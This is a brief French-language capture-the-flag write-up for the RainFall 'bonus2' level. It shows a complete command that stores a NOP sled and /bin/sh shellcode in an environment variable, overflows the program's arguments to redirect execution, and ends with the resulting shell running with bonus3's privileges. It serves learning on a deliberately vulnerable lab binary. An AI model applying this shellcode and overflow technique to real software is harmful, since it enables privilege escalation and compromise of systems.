# Bonus 2

Nous realisons un autre NOP Slide apres apres trouver l'offset et une adresse proche du segfault pour le nop slide que nous mettons sur l'offset
```bonus2@RainFall:~$ env -i LANG="nl" SHELLCODE=`python -c 'print "\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"'` ./bonus2 `python -c 'print "A" * 40'` `python -c 'print "A" * 23 + "\xbc\xff\xff\xbf"'`
Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����
$ id
\uid=2012(bonus2) gid=2012(bonus2) euid=2013(bonus3) egid=100(users) groups=2013(bonus3),100(users),2012(bonus2)
```
